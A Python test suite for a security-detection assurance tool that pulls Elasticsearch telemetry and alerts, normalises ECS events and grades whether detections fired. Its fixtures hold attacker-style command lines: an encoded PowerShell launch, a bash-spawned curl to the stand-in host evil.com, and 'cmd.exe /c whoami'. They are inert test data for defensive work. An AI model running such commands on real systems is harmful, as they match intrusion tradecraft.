"""Comprehensive End-to-End Acceptance Tests for Phase 19 Elasticsearch Integration.

Covers:
- Scenario A: Full detection pipeline success (PASS)
- Scenario B: Telemetry collection failure (EXPECTED_TELEMETRY_MISSING)
- Scenario C: Detection not triggered (DETECTION_NOT_TRIGGERED)
- Scenario D: Elasticsearch communication/auth failure (DiagnosticCategory.ERROR)
- Scenario E: Strict attribution failure (INCONCLUSIVE/MISMATCHED, never false PASS)
- Scenario F: Query window truncation (Status TRUNCATED, uncertainty preserved)
- Transient HTTP 429 retry and recovery
- search_after pagination across multiple pages
- Credential sanitization in raw and normalized telemetry
- SQLiteStore and InMemoryStore persistence parity
"""

from contextlib import contextmanager
from datetime import datetime, timedelta, timezone
from pathlib import Path
import tempfile
from typing import Any, Dict, List
import pytest

from proofshield.connectors.elastic import (
    ElasticAlertClient,
    ElasticClient,
    ElasticClientError,
    ElasticConnectorSettings,
    ElasticTelemetryBatch,
    TelemetryRetrievalStatus,
)
from proofshield.normalisation.ecs import ECSNormaliser
from proofshield.normalisation.engine import NormalisationEngine
from proofshield.schemas import (
    AlertV1,
    AttributionStatus,
    DetectionRuleV1,
    DiagnosticCategory,
    EventCategory,
    ExecutionMode,
    FailureCategory,
    NormalizedTelemetryEventV1,
    RawTelemetryEventV1,
    ScenarioV1,
    TestRunV1,
    ValidationTarget,
)
from proofshield.services.elastic_orchestrator import (
    ElasticAssuranceOrchestrator,
    ElasticOrchestrationReport,
    ElasticOrchestratorSettings,
    NormalizationStatus,
)
from proofshield.services.evaluation import AssuranceEngine
from proofshield.services.sqlite_store import SQLiteStore
from proofshield.services.store import InMemoryStore
from tests.mock_elastic_server import run_mock_elastic_server


def make_ecs_telemetry_hit(
    hit_id: str = "hit-ecs-001",
    timestamp: str = "2026-11-01T12:00:05.000Z",
    hostname: str = "WS-PROD-01",
    process_name: str = "powershell.exe",
    command_line: str = "powershell.exe -NoP -NonI -Enc AAA==",
    token: str = "tok-eval-alpha-001",
    category: str = "process",
    user: str = "SYSTEM",
) -> Dict[str, Any]:
    """Helper to generate standard ECS telemetry document hit."""
    cmd = command_line
    if token and f"execution-token" not in cmd:
        cmd += f" --execution-token={token}"

    return {
        "_index": "logs-endpoint-default",
        "_id": hit_id,
        "_source": {
            "@timestamp": timestamp,
            "ecs": {"version": "8.0.0"},
            "event": {
                "id": hit_id,
                "category": [category],
                "action": "process_started",
                "type": ["start", "process_start"],
            },
            "host": {
                "name": hostname,
                "hostname": f"{hostname}.corp.internal",
                "id": "host-guid-1111",
            },
            "process": {
                "name": process_name,
                "executable": f"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\{process_name}",
                "command_line": cmd,
                "args": cmd.split(),
                "hash": {
                    "sha256": "abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890"
                },
            },
            "user": {
                "name": user,
                "domain": "CORP",
            },
            "labels": {
                "execution_token": token,
            },
        },
    }


def make_ecs_alert_hit(
    hit_id: str = "alert-ecs-001",
    timestamp: str = "2026-11-01T12:00:15.000Z",
    hostname: str = "WS-PROD-01",
    rule_id: str = "rule-powershell-enc",
    rule_name: str = "Suspicious Encoded PowerShell Execution",
    token: str = "tok-eval-alpha-001",
    severity: str = "high",
) -> Dict[str, Any]:
    """Helper to generate standard ECS security alert hit."""
    cmd = "powershell.exe -NoP -NonI -Enc AAA=="
    if token:
        cmd += f" --execution-token={token}"

    return {
        "_index": ".alerts-security.alerts-default",
        "_id": hit_id,
        "_source": {
            "@timestamp": timestamp,
            "kibana.alert.uuid": f"uuid-{hit_id}",
            "kibana.alert.rule.rule_id": rule_id,
            "kibana.alert.rule.uuid": f"uuid-{rule_id}",
            "kibana.alert.rule.name": rule_name,
            "kibana.alert.rule.severity": severity,
            "host": {
                "name": hostname,
                "hostname": f"{hostname}.corp.internal",
                "id": "host-guid-1111",
            },
            "process": {
                "name": "powershell.exe",
                "command_line": cmd,
            },
            "labels": {
                "execution_token": token,
            },
            "message": f"Rule {rule_name} fired on host {hostname}",
        },
    }


def setup_test_context(
    store,
    host="WS-PROD-01",
    rule_id="rule-powershell-enc",
    run_id="RUN-PS-001",
    execution_token="tok-eval-alpha-001",
):
    """Register common detection rule, scenario, and test run in store."""
    rule = DetectionRuleV1(
        rule_id=rule_id,
        rule_name="Suspicious Encoded PowerShell Execution",
        rule_format="elastic_eql",
    )
    store.add_rule(rule)

    scenario = ScenarioV1(
        scenario_id="SCEN-PS-ENC-001",
        name="Encoded PowerShell Test",
        description="Validates detection of encoded PowerShell invocation",
        mitre_technique_id="T1059.001",
        mitre_tactic="Execution",
        expected_event_category=EventCategory.PROCESS_CREATION,
        expected_process_name="powershell.exe",
        expected_command_pattern="powershell.exe -NoP",
        expected_detection_rule_id=rule_id,
        validation_target=ValidationTarget.EXPECTED_ALERT,
    )
    store.add_scenario(scenario)

    t0 = datetime(2026, 11, 1, 12, 0, 0, tzinfo=timezone.utc)
    t1 = datetime(2026, 11, 1, 12, 0, 30, tzinfo=timezone.utc)

    run = TestRunV1(
        run_id=run_id,
        scenario_id="SCEN-PS-ENC-001",
        execution_mode=ExecutionMode.SYNTHETIC_SIMULATION,
        target_host=host,
        target_user="SYSTEM",
        window_start=t0,
        window_end=t1,
        executed_at=t0,
        execution_token=execution_token,
        metadata={"strict_attribution": True},
    )
    store.add_run(run)
    return rule, scenario, run


# ── SCENARIO A: Full Detection Pipeline Success (PASS) ─────────────────────────

def test_scenario_a_full_detection_success():
    """Scenario A: Simulation -> Telemetry -> Normalization -> Alert -> PASS."""
    store = InMemoryStore()
    setup_test_context(store)

    with run_mock_elastic_server() as mock:
        mock.set_telemetry_hits([make_ecs_telemetry_hit(token="tok-eval-alpha-001")])
        mock.set_alert_hits([make_ecs_alert_hit(token="tok-eval-alpha-001")])

        client = mock.get_client()
        orchestrator = ElasticAssuranceOrchestrator(client=client, store=store)

        eval_result, report = orchestrator.evaluate_run_with_orchestration(
            run_id="RUN-PS-001",
            strict_attribution=True,
        )

        assert report.is_complete is True
        assert report.telemetry_status == TelemetryRetrievalStatus.COMPLETE
        assert report.raw_telemetry_persisted == 1
        assert report.normalized_telemetry_persisted == 1
        assert report.alerts_persisted == 1

        assert eval_result.predicted_category == DiagnosticCategory.PASS
        assert eval_result.confidence == "definitive"
        assert len(eval_result.supporting_evidence_ids) >= 2
        attr = eval_result.metadata.get("attribution", {})
        assert attr.get("status") == AttributionStatus.VERIFIED.value


# ── SCENARIO B: Telemetry Collection Failure (EXPECTED_TELEMETRY_MISSING) ──────

def test_scenario_b_telemetry_collection_failure():
    """Scenario B: Simulation -> No telemetry in Elastic -> EXPECTED_TELEMETRY_MISSING."""
    store = InMemoryStore()
    setup_test_context(store)

    with run_mock_elastic_server() as mock:
        # Empty telemetry, no alerts
        mock.set_telemetry_hits([])
        mock.set_alert_hits([])

        client = mock.get_client()
        orchestrator = ElasticAssuranceOrchestrator(client=client, store=store)

        eval_result, report = orchestrator.evaluate_run_with_orchestration(
            run_id="RUN-PS-001",
            strict_attribution=True,
        )

        assert report.is_complete is True
        assert report.telemetry_status == TelemetryRetrievalStatus.EMPTY
        assert report.raw_telemetry_persisted == 0

        assert eval_result.predicted_category == DiagnosticCategory.EXPECTED_TELEMETRY_MISSING


# ── SCENARIO C: Detection Not Triggered (DETECTION_NOT_TRIGGERED) ───────────────

def test_scenario_c_detection_not_triggered():
    """Scenario C: Telemetry collected & normalized, but alert query returns 0 hits."""
    store = InMemoryStore()
    setup_test_context(store)

    with run_mock_elastic_server() as mock:
        # Telemetry exists, but 0 alerts fired
        mock.set_telemetry_hits([make_ecs_telemetry_hit(token="tok-eval-alpha-001")])
        mock.set_alert_hits([])

        client = mock.get_client()
        orchestrator = ElasticAssuranceOrchestrator(client=client, store=store)

        eval_result, report = orchestrator.evaluate_run_with_orchestration(
            run_id="RUN-PS-001",
            strict_attribution=True,
        )

        assert report.is_complete is True
        assert report.raw_telemetry_persisted == 1
        assert report.normalized_telemetry_persisted == 1
        assert report.alerts_persisted == 0

        assert eval_result.predicted_category == DiagnosticCategory.DETECTION_NOT_TRIGGERED


# ── SCENARIO D: Elasticsearch Communication / Auth Failure (ERROR) ────────────

def test_scenario_d_elasticsearch_retrieval_failure():
    """Scenario D: Elasticsearch returns HTTP 401 or network error -> DiagnosticCategory.ERROR."""
    store = InMemoryStore()
    setup_test_context(store)

    with run_mock_elastic_server() as mock:
        # Inject HTTP 401 error
        mock.set_error_hook(
            lambda path, body, headers: (401, {"error": {"type": "security_exception", "reason": "action unauthorized"}})
        )

        client = mock.get_client()
        orchestrator = ElasticAssuranceOrchestrator(client=client, store=store)

        eval_result, report = orchestrator.evaluate_run_with_orchestration(
            run_id="RUN-PS-001",
            strict_attribution=True,
        )

        # Must report failure, NOT false PASS or silent telemetry missing
        assert report.is_complete is False
        assert report.telemetry_status == TelemetryRetrievalStatus.FAILED
        assert eval_result.predicted_category == DiagnosticCategory.ERROR
        assert "unauthorized" in eval_result.reason.lower() or "retrieval failed" in eval_result.reason.lower()


# ── SCENARIO E: Strict Attribution Failure (INCONCLUSIVE / Not Correlated) ─────

def test_scenario_e_strict_attribution_mismatch():
    """Scenario E: Alert has differing token -> INCONCLUSIVE under strict attribution."""
    store = InMemoryStore()
    setup_test_context(store)

    with run_mock_elastic_server() as mock:
        # Telemetry has run token tok-eval-alpha-001
        mock.set_telemetry_hits([make_ecs_telemetry_hit(token="tok-eval-alpha-001")])
        # Alert has a completely different token
        mock.set_alert_hits([make_ecs_alert_hit(token="tok-other-unrelated-999")])

        client = mock.get_client()
        orchestrator = ElasticAssuranceOrchestrator(client=client, store=store)

        eval_result, report = orchestrator.evaluate_run_with_orchestration(
            run_id="RUN-PS-001",
            strict_attribution=True,
        )

        assert report.is_complete is True
        # Must never be PASS when token conflicts under strict attribution
        assert eval_result.predicted_category != DiagnosticCategory.PASS
        attr = eval_result.metadata.get("attribution", {})
        assert attr.get("status") in (
            AttributionStatus.MISMATCHED.value,
            AttributionStatus.CONFLICT.value,
            AttributionStatus.INCONCLUSIVE.value,
            AttributionStatus.UNATTRIBUTED.value,
        )


# ── SCENARIO F: Incomplete Retrieval / Truncation ──────────────────────────────

def test_scenario_f_query_truncation():
    """Scenario F: Elasticsearch returns truncated results -> flags TRUNCATED."""
    with run_mock_elastic_server() as mock:
        hits = [make_ecs_telemetry_hit(hit_id=f"hit-{i}", token="tok-eval-alpha-001") for i in range(10)]
        mock.set_telemetry_hits(hits)
        mock.set_truncation(total=500, relation="gte")

        client = mock.get_client(max_results=5)
        batch = client.search_telemetry(limit=5)

        assert batch.is_truncated is True
        assert batch.status == TelemetryRetrievalStatus.TRUNCATED
        assert batch.total_matched == 500
        assert batch.relation == "gte"
        assert len(batch.hits) == 5

        # Verify raise_on_truncation raises ElasticClientError
        with pytest.raises(ElasticClientError) as exc_info:
            client.search_telemetry(limit=5, raise_on_truncation=True)
        assert "truncated" in str(exc_info.value).lower()


# ── TRANSIENT ERROR RETRY RESILIENCE ──────────────────────────────────────────

def test_transient_http_429_retry_success():
    """Verify client transparently recovers from transient HTTP 429 errors."""
    with run_mock_elastic_server() as mock:
        mock.set_telemetry_hits([make_ecs_telemetry_hit(hit_id="hit-recovered-001")])
        # Queue HTTP 429 on first attempt
        mock.queue_transient_error(code=429, reason="Too Many Requests - rate limit")

        client = mock.get_client()
        batch = client.search_telemetry(limit=10, max_retries=2)

        assert batch.status == TelemetryRetrievalStatus.COMPLETE
        assert len(batch.hits) == 1
        assert batch.hits[0]["_id"] == "hit-recovered-001"


# ── PAGINATION WITH SEARCH_AFTER ──────────────────────────────────────────────

def test_pagination_search_after_multi_page():
    """Verify search_after pagination seamlessly retrieves across page chunks."""
    with run_mock_elastic_server() as mock:
        total_records = 25
        hits = [
            make_ecs_telemetry_hit(
                hit_id=f"hit-page-{i:03d}",
                timestamp=f"2026-11-01T12:00:{i:02d}.000Z",
                token="tok-eval-alpha-001",
            )
            for i in range(total_records)
        ]
        mock.set_telemetry_hits(hits)

        client = mock.get_client(max_results=100)
        # Request batch size of 10 to force 3 pages (10, 10, 5)
        batch = client.search_telemetry(limit=30, batch_size=10)

        assert batch.status == TelemetryRetrievalStatus.COMPLETE
        assert len(batch.hits) == 25
        retrieved_ids = [h["_id"] for h in batch.hits]
        assert retrieved_ids == [f"hit-page-{i:03d}" for i in range(25)]


# ── CREDENTIAL SANITIZATION IN TELEMETRY ──────────────────────────────────────

def test_credential_sanitization_in_ecs_telemetry():
    """Verify sensitive passwords and api keys in ECS telemetry payloads are redacted."""
    raw_payload = {
        "@timestamp": "2026-11-01T12:00:00Z",
        "ecs": {"version": "8.0.0"},
        "host": {"name": "WS-SEC-01"},
        "process": {
            "name": "app.exe",
            "command_line": "app.exe --api-key=supersecret --token=tok-safe-123",
        },
        "password": "CleartextPassword123!",
        "api_key": "elastic_agent_secret_key",
        "authorization": "Bearer ya29.secret_bearer_token",
        "user_password_hash": "$6$saltsalt$hashedpassword",
    }

    raw_event = RawTelemetryEventV1(
        schema_version="v1",
        raw_event_id="elastic:raw:test-sec-01",
        source_event_id="test-sec-01",
        source_format="elastic_ecs",
        source_timestamp=datetime(2026, 11, 1, 12, 0, 0, tzinfo=timezone.utc),
        ingested_at=datetime.now(timezone.utc),
        raw_payload=raw_payload,
    )

    normaliser = ECSNormaliser()
    assert normaliser.can_handle(raw_event)
    norm = normaliser.normalize(raw_event)

    # password and api_key must be scrubbed in extra_attributes
    assert norm.extra_attributes["password"] == "[REDACTED]"
    assert norm.extra_attributes["api_key"] == "[REDACTED]"
    # Legitimate non-secret hash suffix preserved
    assert norm.extra_attributes["user_password_hash"] == "$6$saltsalt$hashedpassword"
    # Execution token extracted
    assert norm.execution_token == "tok-safe-123"


# ── SQLITE STORE & IN-MEMORY STORE PARITY ─────────────────────────────────────

def test_store_persistence_parity():
    """Verify orchestrator behaves identically on InMemoryStore and SQLiteStore."""
    with tempfile.TemporaryDirectory() as tmp_dir:
        db_path = Path(tmp_dir) / "test_parity.db"

        mem_store = InMemoryStore()
        sql_store = SQLiteStore(db_path=db_path)

        try:
            setup_test_context(mem_store)
            setup_test_context(sql_store)

            with run_mock_elastic_server() as mock:
                mock.set_telemetry_hits([make_ecs_telemetry_hit(token="tok-eval-alpha-001")])
                mock.set_alert_hits([make_ecs_alert_hit(token="tok-eval-alpha-001")])

                client = mock.get_client()

                orch_mem = ElasticAssuranceOrchestrator(client=client, store=mem_store)
                orch_sql = ElasticAssuranceOrchestrator(client=client, store=sql_store)

                rep_mem = orch_mem.ingest_for_run("RUN-PS-001")
                rep_sql = orch_sql.ingest_for_run("RUN-PS-001")

                assert rep_mem.raw_telemetry_persisted == rep_sql.raw_telemetry_persisted == 1
                assert rep_mem.normalized_telemetry_persisted == rep_sql.normalized_telemetry_persisted == 1
                assert rep_mem.alerts_persisted == rep_sql.alerts_persisted == 1

                # Test duplicate ingestion idempotency
                rep_mem_2 = orch_mem.ingest_for_run("RUN-PS-001")
                rep_sql_2 = orch_sql.ingest_for_run("RUN-PS-001")

                assert rep_mem_2.raw_telemetry_persisted == rep_sql_2.raw_telemetry_persisted == 0
                assert rep_mem_2.duplicate_raw_count == rep_sql_2.duplicate_raw_count == 1
                assert rep_mem_2.duplicate_alert_count == rep_sql_2.duplicate_alert_count == 1
        finally:
            sql_store.close()


# ── ECS NORMALISER COMPREHENSIVE UNIT TESTS ───────────────────────────────────

def test_ecs_normaliser_categories():
    """Verify ECSNormaliser maps all canonical security categories accurately."""
    normaliser = ECSNormaliser()

    # Network connection
    net_event = RawTelemetryEventV1(
        schema_version="v1",
        raw_event_id="elastic:raw:net-01",
        source_event_id="net-01",
        source_format="elastic_ecs",
        source_timestamp=datetime(2026, 11, 1, 12, 0, 0, tzinfo=timezone.utc),
        ingested_at=datetime.now(timezone.utc),
        raw_payload={
            "@timestamp": "2026-11-01T12:00:00Z",
            "event": {"category": ["network"], "action": "connection_accepted"},
            "host": {"name": "SRV-WEB-01"},
            "destination": {"ip": "192.168.1.100", "port": 443},
        },
    )
    assert normaliser.can_handle(net_event)
    net_norm = normaliser.normalize(net_event)
    assert net_norm.event_category == EventCategory.NETWORK_CONNECTION
    assert net_norm.network_destination_ip == "192.168.1.100"
    assert net_norm.network_destination_port == 443

    # File event
    file_event = RawTelemetryEventV1(
        schema_version="v1",
        raw_event_id="elastic:raw:file-01",
        source_event_id="file-01",
        source_format="elastic_ecs",
        source_timestamp=datetime(2026, 11, 1, 12, 0, 0, tzinfo=timezone.utc),
        ingested_at=datetime.now(timezone.utc),
        raw_payload={
            "@timestamp": "2026-11-01T12:00:00Z",
            "event": {"category": ["file"], "action": "file_created"},
            "host": {"name": "WS-DEV-01"},
            "file": {"path": "C:\\temp\\malware.exe", "hash": {"sha256": "1234abcd"}},
            "destination": {"ip": "1.2.3.4", "port": 80},  # should be gated out for file event
        },
    )
    file_norm = normaliser.normalize(file_event)
    assert file_norm.event_category == EventCategory.FILE_EVENT
    # Network fields must be gated out for FILE_EVENT
    assert file_norm.network_destination_ip is None
    assert file_norm.network_destination_port is None
    assert file_norm.hashes.get("sha256") == "1234abcd"

    # Authentication event
    auth_event = RawTelemetryEventV1(
        schema_version="v1",
        raw_event_id="elastic:raw:auth-01",
        source_event_id="auth-01",
        source_format="elastic_ecs",
        source_timestamp=datetime(2026, 11, 1, 12, 0, 0, tzinfo=timezone.utc),
        ingested_at=datetime.now(timezone.utc),
        raw_payload={
            "@timestamp": "2026-11-01T12:00:00Z",
            "event": {"category": ["authentication"], "action": "user_login"},
            "host": {"name": "DC-01"},
            "user": {"name": "administrator", "domain": "ENTERPRISE"},
        },
    )
    auth_norm = normaliser.normalize(auth_event)
    assert auth_norm.event_category == EventCategory.AUTHENTICATION
    assert auth_norm.user == "ENTERPRISE\\administrator"

    # Registry event
    reg_event = RawTelemetryEventV1(
        schema_version="v1",
        raw_event_id="elastic:raw:reg-01",
        source_event_id="reg-01",
        source_format="elastic_ecs",
        source_timestamp=datetime(2026, 11, 1, 12, 0, 0, tzinfo=timezone.utc),
        ingested_at=datetime.now(timezone.utc),
        raw_payload={
            "@timestamp": "2026-11-01T12:00:00Z",
            "event": {"category": ["registry"]},
            "host": {"name": "WS-01"},
            "registry": {"path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"},
        },
    )
    reg_norm = normaliser.normalize(reg_event)
    assert reg_norm.event_category == EventCategory.REGISTRY_EVENT


def test_ecs_normaliser_args_and_path_fallbacks():
    """Verify fallback from process.args to command_line and executable to process_name."""
    normaliser = ECSNormaliser()

    raw_event = RawTelemetryEventV1(
        schema_version="v1",
        raw_event_id="elastic:raw:proc-02",
        source_event_id="proc-02",
        source_format="elastic_ecs",
        source_timestamp=datetime(2026, 11, 1, 12, 0, 0, tzinfo=timezone.utc),
        ingested_at=datetime.now(timezone.utc),
        raw_payload={
            "@timestamp": "2026-11-01T12:00:00Z",
            "event": {"category": ["process"]},
            "host": {"id": "host-id-fallback-01"},
            "process": {
                "executable": "/usr/bin/curl",
                "args": ["curl", "-s", "http://evil.com", "--token=tok-linux-777"],
                "parent": {
                    "executable": "/bin/bash",
                    "args": ["/bin/bash", "-c", "curl -s http://evil.com"],
                },
            },
        },
    )

    norm = normaliser.normalize(raw_event)
    assert norm.host == "host-id-fallback-01"
    assert norm.process_name == "curl"
    assert norm.process_path == "/usr/bin/curl"
    assert norm.command_line == "curl -s http://evil.com --token=tok-linux-777"
    assert norm.parent_process_name == "bash"
    assert norm.parent_command_line == "/bin/bash -c curl -s http://evil.com"
    assert norm.execution_token == "tok-linux-777"


def test_normalisation_engine_includes_ecs():
    """Verify default NormalisationEngine automatically handles ECS telemetry."""
    engine = NormalisationEngine()
    raw_event = RawTelemetryEventV1(
        schema_version="v1",
        raw_event_id="elastic:raw:engine-test-01",
        source_event_id="engine-test-01",
        source_format="elastic_ecs",
        source_timestamp=datetime(2026, 11, 1, 12, 0, 0, tzinfo=timezone.utc),
        ingested_at=datetime.now(timezone.utc),
        raw_payload={
            "@timestamp": "2026-11-01T12:00:00Z",
            "host": {"hostname": "WS-ENGINE-01"},
            "process": {"name": "cmd.exe", "command_line": "cmd.exe /c whoami [TOKEN:tok-cmd-99]"},
        },
    )
    norm = engine.normalize(raw_event)
    assert norm.normalized_event_id.startswith("NORM-ECS-")
    assert norm.host == "WS-ENGINE-01"
    assert norm.process_name == "cmd.exe"
    assert norm.execution_token == "tok-cmd-99"


def test_elastic_orchestrator_campaign_evidence_ingestion():
    """Verify ElasticAssuranceOrchestrator can ingest evidence across a campaign window."""
    store = InMemoryStore()
    with run_mock_elastic_server() as mock:
        mock.set_telemetry_hits([
            make_ecs_telemetry_hit(hit_id="tel-camp-01", token="tok-camp-1"),
            make_ecs_telemetry_hit(hit_id="tel-camp-02", token="tok-camp-2"),
        ])
        mock.set_alert_hits([
            make_ecs_alert_hit(hit_id="alert-camp-01", token="tok-camp-1"),
        ])

        client = mock.get_client()
        orchestrator = ElasticAssuranceOrchestrator(client=client, store=store)

        t_start = datetime(2026, 11, 1, 10, 0, 0, tzinfo=timezone.utc)
        t_end = datetime(2026, 11, 1, 14, 0, 0, tzinfo=timezone.utc)

        rep = orchestrator.ingcampaign_evidence = orchestrator.ingest_campaign_evidence(
            campaign_id="CAMP-Q4-001",
            window_start=t_start,
            window_end=t_end,
            hosts=["WS-PROD-01"],
            fetch_telemetry=True,
            fetch_alerts=True,
        )

        assert rep.campaign_id == "CAMP-Q4-001"
        assert rep.raw_telemetry_persisted == 2
        assert rep.normalized_telemetry_persisted == 2
        assert rep.alerts_persisted == 1
        assert rep.is_complete is True


def test_delayed_alert_settling():
    """Verify handling of delayed alert appearance in Elasticsearch."""
    with run_mock_elastic_server() as mock:
        mock.set_alert_hits([make_ecs_alert_hit(hit_id="alert-settle-01")])
        # Force empty on first poll, then hit on second poll
        mock.set_delayed_alerts(empty_polls=1)

        client = mock.get_client()

        # First query: empty
        alerts_1 = client.fetch_and_map_alerts()
        assert len(alerts_1) == 0

        # Second query: alert appeared
        alerts_2 = client.fetch_and_map_alerts()
        assert len(alerts_2) == 1
        assert alerts_2[0].alert_id == "elastic:alert-settle-01"


def test_network_io_outside_store_transaction_in_poll_and_ingest():
    """Verify that HTTP network requests in poll_and_ingest and poll_and_ingest_telemetry
    are strictly executed outside any store transaction.
    """
    store = InMemoryStore()
    in_transaction = False
    original_transaction = store.transaction

    @contextmanager
    def tracked_transaction():
        nonlocal in_transaction
        in_transaction = True
        try:
            with original_transaction():
                yield
        finally:
            in_transaction = False

    store.transaction = tracked_transaction
    transaction_active_during_http = []

    with run_mock_elastic_server() as mock:
        mock.set_alert_hits([make_ecs_alert_hit(hit_id="alert-trans-01")])
        mock.set_telemetry_hits([make_ecs_telemetry_hit(hit_id="tel-trans-01")])
        client = mock.get_client()

        # Hook into client._post_search to check if store.transaction is active
        original_post_search = client._post_search
        def monitored_post_search(*args, **kwargs):
            transaction_active_during_http.append(in_transaction)
            return original_post_search(*args, **kwargs)

        client._post_search = monitored_post_search

        # Test poll_and_ingest with atomic=True
        ingested_alerts = client.poll_and_ingest(store=store, atomic=True)
        assert len(ingested_alerts) == 1
        assert len(transaction_active_during_http) >= 1
        assert all(active is False for active in transaction_active_during_http)

        transaction_active_during_http.clear()

        # Test poll_and_ingest_telemetry with atomic=True
        ingested_raw = client.poll_and_ingest_telemetry(store=store, atomic=True)
        assert len(ingested_raw) == 1
        assert len(transaction_active_during_http) >= 1
        assert all(active is False for active in transaction_active_during_http)


def test_sqlite_store_network_io_no_write_lock():
    """Verify that SQLiteStore is not locked in a transaction while network I/O is executing."""
    with tempfile.TemporaryDirectory() as tmp_dir:
        db_path = Path(tmp_dir) / "test_nointx.db"
        store = SQLiteStore(db_path=db_path)
        try:
            in_transaction = False
            original_transaction = store.transaction

            @contextmanager
            def tracked_transaction():
                nonlocal in_transaction
                in_transaction = True
                try:
                    with original_transaction() as cur:
                        yield cur
                finally:
                    in_transaction = False

            store.transaction = tracked_transaction
            transaction_active_during_http = []

            with run_mock_elastic_server() as mock:
                mock.set_alert_hits([make_ecs_alert_hit(hit_id="alert-sql-01")])
                client = mock.get_client()

                original_post_search = client._post_search

                def slow_post_search(*args, **kwargs):
                    transaction_active_during_http.append(in_transaction)
                    # Verify we can perform a write to the store during the HTTP call
                    temp_scenario = ScenarioV1(
                        schema_version="v1",
                        scenario_id="SCEN-CONCURRENT-01",
                        name="Concurrent Write Test",
                        description="Test no transaction held during HTTP",
                        validation_target=ValidationTarget.EXPECTED_ALERT,
                        mitre_technique_id="T1059.001",
                        mitre_tactic="Execution",
                        expected_event_category=EventCategory.PROCESS_CREATION,
                        expected_process_name="cmd.exe",
                    )
                    store.add_scenario(temp_scenario)
                    return original_post_search(*args, **kwargs)

                client._post_search = slow_post_search

                ingested = client.poll_and_ingest(store=store, atomic=True)
                assert len(ingested) == 1
                assert len(transaction_active_during_http) >= 1
                assert all(active is False for active in transaction_active_during_http)
                assert store.get_scenario("SCEN-CONCURRENT-01") is not None
        finally:
            store.close()


def test_partial_normalization_failure_handling():
    """Verify that when some events fail normalization:
    1. Raw events are still persisted.
    2. Successfully normalized events are persisted.
    3. NormalizationStatus is marked PARTIAL and is_complete is False.
    4. Diagnostic evaluation yields DiagnosticCategory.ERROR (never false EXPECTED_TELEMETRY_MISSING).
    """
    store = InMemoryStore()
    setup_test_context(store, run_id="RUN-NORM-PARTIAL-01", execution_token="tok-valid-01")

    with run_mock_elastic_server() as mock:
        # 1 valid event, 1 malformed event that causes normalization to fail
        mock.set_telemetry_hits([
            make_ecs_telemetry_hit(hit_id="tel-valid-01", token="tok-valid-01"),
            make_ecs_telemetry_hit(hit_id="tel-malformed-02", token="tok-invalid-02"),
        ])
        mock.set_alert_hits([
            make_ecs_alert_hit(hit_id="alert-norm-01", token="tok-valid-01")
        ])

        client = mock.get_client()

        # Custom normaliser that throws on tel-malformed-02
        normaliser = NormalisationEngine()
        orig_normalize = normaliser.normalize
        def flaky_normalize(raw_ev):
            if "tel-malformed-02" in raw_ev.raw_event_id:
                raise ValueError("Simulated malformed ECS payload in parser")
            return orig_normalize(raw_ev)

        normaliser.normalize = flaky_normalize

        orchestrator = ElasticAssuranceOrchestrator(
            client=client,
            store=store,
            normaliser=normaliser,
        )

        result, report = orchestrator.evaluate_run_with_orchestration(
            run_id="RUN-NORM-PARTIAL-01",
            strict_attribution=True,
        )

        # Raw events persisted: both
        assert report.raw_telemetry_persisted == 2
        # Normalized events persisted: only the valid 1
        assert report.normalized_telemetry_persisted == 1
        # Status checks
        assert report.normalization_status == NormalizationStatus.PARTIAL
        assert report.is_complete is False
        assert len(report.normalization_errors) == 1
        assert "Simulated malformed ECS payload" in report.normalization_errors[0]

        # Crucial assurance check: predicted category MUST be ERROR, NOT EXPECTED_TELEMETRY_MISSING or PASS
        assert result.predicted_category == DiagnosticCategory.ERROR
        assert "Normalisation error" in result.reason or "Simulated malformed ECS payload" in result.reason


def test_full_normalization_failure_handling():
    """Verify that when all events fail normalization:
    1. Raw events are persisted.
    2. Normalized events count is 0.
    3. NormalizationStatus is marked FAILED and is_complete is False.
    4. Diagnostic evaluation yields DiagnosticCategory.ERROR.
    """
    store = InMemoryStore()
    setup_test_context(store, run_id="RUN-NORM-FAIL-01", execution_token="tok-fail-01")

    with run_mock_elastic_server() as mock:
        mock.set_telemetry_hits([
            make_ecs_telemetry_hit(hit_id="tel-fail-01", token="tok-fail-01"),
        ])
        client = mock.get_client()

        normaliser = NormalisationEngine()
        def broken_normalize(raw_ev):
            raise RuntimeError("Parser engine crashed")
        normaliser.normalize = broken_normalize

        orchestrator = ElasticAssuranceOrchestrator(
            client=client,
            store=store,
            normaliser=normaliser,
        )

        result, report = orchestrator.evaluate_run_with_orchestration(
            run_id="RUN-NORM-FAIL-01",
            strict_attribution=True,
        )

        assert report.raw_telemetry_persisted == 1
        assert report.normalized_telemetry_persisted == 0
        assert report.normalization_status == NormalizationStatus.FAILED
        assert report.is_complete is False
        assert result.predicted_category == DiagnosticCategory.ERROR


def test_orchestrator_alert_settling_with_injected_sleep():
    """Verify ElasticAssuranceOrchestrator alert settling policy:
    - alert_settling_delay_seconds: initial delay
    - alert_settling_max_polls: multiple polling attempts
    - alert_settling_poll_interval_seconds: pause between polls
    - sleep_fn: invoked with expected durations without blocking test execution
    """
    store = InMemoryStore()
    setup_test_context(store, run_id="RUN-SETTLE-01", execution_token="tok-settle-01")

    with run_mock_elastic_server() as mock:
        mock.set_telemetry_hits([
            make_ecs_telemetry_hit(hit_id="tel-settle-01", token="tok-settle-01"),
        ])
        mock.set_alert_hits([
            make_ecs_alert_hit(hit_id="alert-settle-01", token="tok-settle-01"),
        ])
        # Alert appears only on 3rd poll (empty_polls=2)
        mock.set_delayed_alerts(empty_polls=2)

        client = mock.get_client()

        slept_intervals = []
        def mock_sleep(seconds: float):
            slept_intervals.append(seconds)

        settings = ElasticOrchestratorSettings(
            alert_settling_delay_seconds=3.0,
            alert_settling_poll_interval_seconds=1.5,
            alert_settling_max_polls=4,
        )

        orchestrator = ElasticAssuranceOrchestrator(
            client=client,
            store=store,
            settings=settings,
            sleep_fn=mock_sleep,
        )

        result, report = orchestrator.evaluate_run_with_orchestration(
            run_id="RUN-SETTLE-01",
            strict_attribution=True,
        )

        # Expected sleep sequence:
        # 1. Initial settling delay: 3.0s
        # 2. Poll 1: 0 alerts -> sleep 1.5s
        # 3. Poll 2: 0 alerts -> sleep 1.5s
        # 4. Poll 3: alert found -> returns immediately, no 4th poll!
        assert slept_intervals == [3.0, 1.5, 1.5]
        assert report.alerts_persisted == 1
        assert report.alerts_status == "COMPLETE"
        assert report.is_complete is True
        assert result.predicted_category == DiagnosticCategory.PASS


